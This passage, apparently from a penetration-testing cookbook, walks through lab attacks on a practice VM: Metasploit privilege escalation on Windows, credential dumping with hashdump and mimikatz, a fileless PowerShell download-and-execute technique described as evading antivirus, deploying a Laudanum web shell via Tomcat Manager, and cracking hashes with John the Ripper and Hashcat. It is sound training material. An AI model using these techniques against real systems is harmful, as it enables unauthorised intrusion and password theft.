    "2008 R2" /usr/share/exploitdb/windows/local/*`) to look inside the exploits''
    text, we will find more:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/d005b5af-2bb3-486f-aa67-d919686ba955.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Now we need to select one exploit that works for our configuration. A somewhat
    efficient way of doing that is using the `head` command to look at the first lines
    of each candidate. For example, in the screenshot, we look at the first 20 lines
    of exploit number `40410` and we can see it exploits some software called `Zortam
    Mp3 Media Studio`, which is unlikely to be installed in our target. So we check
    another:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/ebb893fa-9d79-4f3b-8dd9-8a75238afc9d.png)'
  prefs: []
  type: TYPE_IMG
- en: 'We keep looking until we find exploit number `35101`, which exploits an internal
    Windows component and says it has been proven to work in our target system. It
    is also a Metasploit module, so we may find it in `msfconsole` and use our existing
    meterpreter session to trigger it. The next screenshot shows some key points:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/c9de7d18-30de-48b6-bfb6-d93eda5eb378.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Open `msfconsole` and search for `TrackPopupMenu`, part of the exploit''s name.
    The one we are looking for is the one from 2014, `windows/local/ms14_058_track_popup_menu`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/05e4d1c7-3687-42e1-bb20-febd2dcd41fd.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Load and configure the module as shown below:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE8]'
  prefs: []
  type: TYPE_PRE
- en: 'The final exploit configuration should look like this:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/57802ab6-8d7c-4d28-8f3d-1e54cf459558.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Run the exploit and see how it retrieves a new meterpreter session:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/e0f96743-7a38-4f80-89cb-3672b0c648e2.png)'
  prefs: []
  type: TYPE_IMG
- en: 'From this new session, we can verify it is running as a system (`getuid`).
    We can dump the password hashes of local users (`hashdump`), we can load meterpreter
    modules such as `mimikatz`, which allows us to recover clear-text passwords from
    the host''s memory (`kerberos`, `wdigest`, `tspkg`), and we can perform many other
    Windows post-exploitation tasks, as illustrated:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/aa8fcb3c-6eb6-4bee-aaed-b1fd50dc5d28.png)'
  prefs: []
  type: TYPE_IMG
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Our first move after gaining access to command execution through a web-shell
    was to use that command execution capability to upload a more advanced shell to
    the host so we could try privilege escalation exploits.
  prefs: []
  type: TYPE_NORMAL
- en: First, we prepared a metasploit payload using `msfvenom` and set up its handler.
    Then we used PowerShell and its **Invoke-Expression** (**IEX**) command. This
    takes a string and executes it as a script; the string we gave it as parameter
    was the contents of a file stored in our server that was downloaded using the
    `WebClient` object and its `DownloadString` function. This way, the contents of
    the remote file were passed directly to be executed by IEX without them being
    stored on the disk. This prevents the action of most antiviruses, as they react
    to read and write events on disk, not in memory.
  prefs: []
  type: TYPE_NORMAL
- en: With the advanced shell, we discovered that the quick privilege escalation methods
    were not working, then we looked into Exploit-DB for a local exploit to gain system
    access. The exploit we found was already part of Metasploit, so we just loaded
    it and used the active session to trigger it. That was the purpose of sending
    our first session to the background and the setting of the session value in the
    exploit configuration. After selecting a `payload`, and setting up a receiving
    host and port (`lhost` and `lport`) for the reverse connection, we launched the
    exploit. It was successful, returning us a new meterpreter session, this time
    with system privileges.
  prefs: []
  type: TYPE_NORMAL
- en: See also
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'As in the Unix case, pentestmonkey also has a small program to evaluate the
    configuration of the Windows operating system and to find possible privilege escalation
    weaknesses in it. This program is called `windows-privesc-check.exe` ([https://github.com/pentestmonkey/windows-privesc-check/](https://github.com/pentestmonkey/windows-privesc-check/)).
    The next screenshot shows an example of running it, displaying only security issues
    (in audit mode or `--audit`), performing the most basic sets of checks (`-a`),
    showing only results exploitable by the current user (`-c`), and saving the output,
    three files—`.html`, `.txt` and `.xml`—with the prefix `privesc-check` (`-o privesc-check`):'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/76b683e3-cca1-40f0-a55d-4138bae8e237.png)'
  prefs: []
  type: TYPE_IMG
- en: 'The following screenshot shows the resulting report in HTML format:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/50657292-e042-4cc3-89bb-e25299d7e1fc.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Another very interesting option for persistence, privilege escalation, and
    post exploitation is Empire ([https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)).
    It works by setting up agents in the compromised hosts that send information and
    perform commands sent via listeners hosted in the attacking machine. Empire includes
    modules for multiple operating systems for persistence (keeping access to the
    compromised hosts even after reboots or restarting services), privilege escalation,
    reconnaissance, lateral movement, data exfiltration, and even trolling and pranking.
    It is not included in the default installation of Kali Linux, but can easily be
    downloaded from the preceding URL and installed. This is what its main screen
    looks like:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/34d29836-7f10-403b-90c3-93df428c1b01.png)'
  prefs: []
  type: TYPE_IMG
- en: Using Tomcat Manager to execute code
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In [Chapter 4](e0105da6-90d8-444c-a4b8-f7b6baa6d984.xhtml), *Testing Authentication
    and Session Management*, we obtained the Tomcat Manager credentials and mentioned
    that this could lead us to execute code in the server. In this recipe, we will
    use such credentials to log in to the manager and upload a new application that
    will allow us to execute operating system commands within the server.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'For this recipe, we come back to our OWASP BWA machine `vm_1`, and start from
    the point where we already know the credentials for the Tomcat server:'
  prefs: []
  type: TYPE_NORMAL
- en: 'Browse to `http://192.168.56.11:8080/manager/html` and, when asked for username
    and password, use the ones obtained previously—`root` as username and `owaspbwa`
    as the password:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/69385e78-7eef-4d85-ad1e-b1c45f95bc3d.png)'
  prefs: []
  type: TYPE_IMG
- en: Once inside the manager, look for the section WAR file to deploy and click on
    the Browse button.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Kali includes a collection of web-shells in `/usr/share/laudanum`. Browse there
    and select the `/usr/share/laudanum/jsp/cmd.war` file:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/abeb1de9-4b8b-4855-a4e7-7297c67ec411.png)'
  prefs: []
  type: TYPE_IMG
- en: 'After it has loaded, click Deploy:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/f20dde00-1edf-49d3-b269-03179d952ca9.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Verify that you have a new application called `cmd`, as shown:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/c2d63085-f54e-4dbb-9981-ef16e0b29b01.png)'
  prefs: []
  type: TYPE_IMG
- en: Let's try it; browse to `http://192.168.56.11:8080/cmd/cmd.jsp`.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'If everything goes right, you should see a page with a textbox and a Send button.
    In the textbox, try a command and send it, for example `ifconfig`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/9beefd4f-21b8-41dc-8fdf-aac2d1a083d6.png)'
  prefs: []
  type: TYPE_IMG
- en: 'We can now execute commands, but which user and what privilege level do we
    have? Try the `whoami` command:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/a65a7ea8-0704-4708-8aa4-65b53eda3cb5.png)'
  prefs: []
  type: TYPE_IMG
- en: We can see Tomcat is running with root privileges in this server. That means
    that at this point, we have full control of it and can perform any operation,
    such as creating or removing users, installing software, configuring operating
    system options, and much more.
  prefs: []
  type: TYPE_NORMAL
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Once we obtain the credentials for Tomcat Manager, the attack flow is pretty
    straightforward. We just need an application useful enough for us to upload it.
    Laudanum, included by default in Kali Linux, is a collection of web-shells for
    various languages and types of web servers, including PHP, ASP, ASP .Net, and
    JSP. What can be more useful to a penetration tester than a web-shell?
  prefs: []
  type: TYPE_NORMAL
- en: Tomcat has the ability to take a Java web application packaged in WAR format
    and can deploy it in the server. We used this functionality to upload the web-shell
    included in Laudanum and, after it was uploaded and deployed, we just browsed
    to it and, by executing system commands, discovered that we had root access in
    that system, as the server was not properly configured and had Tomcat running
    under the root user.
  prefs: []
  type: TYPE_NORMAL
- en: Cracking password hashes with John the Ripper by using a dictionary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In previous chapters, we extracted password hashes from databases; using hash
    strings is the most common method to find passwords in a penetration test. In
    order to discover the real password, we need to decipher them and, as hashes are
    generated through irreversible algorithms, we have no way of decrypting the password
    directly. Hence, it is necessary to use slower methods like brute force and dictionary
    cracking.
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will use **John the Ripper** (**JTR** or simply **John**),
    the most popular password cracker, to recover passwords from the hashes extracted
    in the step-by-step SQL injection recipe in [Chapter 6](680e9e0d-a892-4c37-b2ad-ce8d27d462b5.xhtml), *Exploiting
    Injection Vulnerabilities*.
  prefs: []
  type: TYPE_NORMAL
- en: Getting ready
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: As the title of this recipe states, we will use a dictionary, that is, a list
    of words or possible passwords to crack previously obtained password hashes. Kali
    Linux includes several word lists in the `/usr/share/wordlists/` directory. The
    one we will use in this recipe is RockYou, which comes by default compressed in
    GZIP format.
  prefs: []
  type: TYPE_NORMAL
- en: 'To uncompress the RockYou dictionary, we first need to go to the `cd /usr/share/wordlists/` directory,
    then simply extract the archive contents using the `gunzip` command: `gunzip rockyou.txt.gz`.
    The next screenshot illustrates this process:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/d1a30b9a-55b8-463f-b08f-00637ac3aaa8.png)'
  prefs: []
  type: TYPE_IMG
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Once we have a list of hashes to crack and a dictionary, let''s proceed:'
  prefs: []
  type: TYPE_NORMAL
- en: 'Although John the Ripper is very flexible with regards to how it receives input,
    to prevent misinterpretations, we first need to set usernames and password hashes
    in a specific format. Create a text file called `hashes_6_7.txt`, containing one
    name and hash per line, separated by a colon (`username:hash`), as illustrated:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/b101f485-d65b-4b42-8b79-39d441c291aa.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Once we have the file, we can go to a Terminal and execute the `john --wordlist=/usr/share/wordlists/rockyou.txt
    --format=raw-md5 hashes_6_7.txt` command:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/5fd623e2-f86f-4a01-ac20-8d08868af9cd.png)'
  prefs: []
  type: TYPE_IMG
- en: There are five out of six passwords in the word list. We can also see that `john`
    checked 2,607,000 comparisons per second (`2,607 KC/s`).
  prefs: []
  type: TYPE_NORMAL
- en: '`john` also has the option to apply modifier rules, add prefixes or suffixes,
    change the case of letters, and use leet speak on every password. Let''s try the
    following command on the still-uncracked password:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE9]'
  prefs: []
  type: TYPE_PRE
- en: We can see that the rules worked and we found the last password:![](assets/c42d56ed-7b8d-4eb3-828f-eaf3f4203bd4.png)
  prefs: []
  type: TYPE_NORMAL
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: John (and every other offline password cracker) works by hashing the words in
    the list (or the ones it generates) and comparing them to the hashes to be cracked
    and, when there is a match, it assumes the password has been found.
  prefs: []
  type: TYPE_NORMAL
- en: The first command uses the `--wordlist` option to tell John what words to use.
    If it is omitted, it generates its own list to generate a brute force attack.
    The `--format` option tells us what algorithm was used to generate the hashes,
    and if the format has been omitted, John tries to guess it, usually with good
    results. Lastly, we include the file that contains the hashes we want to crack.
  prefs: []
  type: TYPE_NORMAL
- en: 'We can increase the chance of finding passwords by using the `--rules` option
    because it applies common modifications people make to words when trying to create
    harder passwords to crack. For example, for the word password, John will also
    try the following, among others:'
  prefs: []
  type: TYPE_NORMAL
- en: '`Password`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`PASSWORD`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`password123`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`Pa$$w0rd`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Cracking password hashes via Brute Force using Hashcat
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In recent years, the development of graphics cards has evolved enormously; the
    chips they include now have hundreds or thousands of processors inside them and
    all of them work in parallel. This, when applied to password cracking, means that
    if a single processor can calculate 10,000 hashes in a second, one GPU with 1,000
    cores can do up to 10 million. That means reducing cracking times by a factor
    of 1,000 or more.
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will use Hashcat to crack hashes by brute force. This will
    work only if you have Kali Linux installed as a base system on a computer with
    an Nvidia or ATI chipset. If you have Kali Linux on a virtual machine, GPU cracking
    may not work, but you can always install Hashcat on your host machine. There are
    versions for both Windows and Linux ([https://hashcat.net/hashcat/](https://hashcat.net/hashcat/)).
  prefs: []
  type: TYPE_NORMAL
- en: Getting ready
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'You need to be sure you have your graphics drivers correctly installed and
    that oclHashcat is compatible with them, so you need to do the following:'
  prefs: []
  type: TYPE_NORMAL
- en: 'Run Hashcat independently; it will tell you if there is a problem: `hashcat`'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Test the hashing rate for each algorithm it supports in benchmark mode `hashcat
    --benchmark`
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Depending on your installation, Hashcat may need to be forced to work with
    your specific graphics card: `hashcat --benchmark --force`'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'We will use the same hashes file we used in the previous recipe:'
  prefs: []
  type: TYPE_NORMAL
- en: 'First let''s crack a single hash. Take the admin''s hash: `hashcat -m 0 -a
    3 21232f297a57a5a743894a0e4a801fc3`. The result should appear quickly:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/b86798cd-a8d5-42d1-b154-b5597fd1cc40.png)'
  prefs: []
  type: TYPE_IMG
- en: As you can see, we are able to set the hash directly from the command line and
    it will be cracked in less than a second.
  prefs: []
  type: TYPE_NORMAL
- en: 'Now, to crack the whole file, we need to eliminate the usernames from it and
    leave only the hashes, as shown:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/14f3df7e-a25b-4289-a5f4-cdb72ea984c9.png)'
  prefs: []
  type: TYPE_IMG
- en: 'To crack the hashes from a file, we just replace the hash for the filename
    in the previous command: `oclhashcat -m 0 -a 3 hashes_only_6_7.txt`. As you can
    see in the following screenshot, using an old GPU, Hashcat can cover all the possible
    combinations of one to seven characters (at a rate of 688.5 million hashes per
    second) in just 10 minutes, and it would take a little more than 2 hours to test
    all the combinations of eight characters. That seems pretty good for Brute Force:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/1132ee3a-0491-4e33-a8a2-96bf8d7301fa.png)'
  prefs: []
  type: TYPE_IMG
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'The parameters we used to run Hashcat in this recipe were the ones for defining
    the hashing algorithm to be used: `-m 0` tells the program to use MD5 to hash
    the words it generates and the type of attack. `-a 3` means that we want to use
    a pure Brute Force attack and try every possible character combination until we
    arrive at the password. Finally, we added the hash we wanted to crack in the first
    case and the file containing a collection of hashes in the second case.'
  prefs: []
  type: TYPE_NORMAL
- en: Hashcat can also use a dictionary file and create a hybrid attack (Brute Force
    plus dictionary) to define which character sets to test for and save the results
    to a specified file (it saves them to `/usr/share/oclhashcat/Hashcat.pot`). It
    can also apply rules to words and use statistical models (Markov chains) to increase
    the efficiency of the cracking. To see all of its options, use the `--help` option,
    as shown: `oclhashcat --help`.
  prefs: []
  type: TYPE_NORMAL
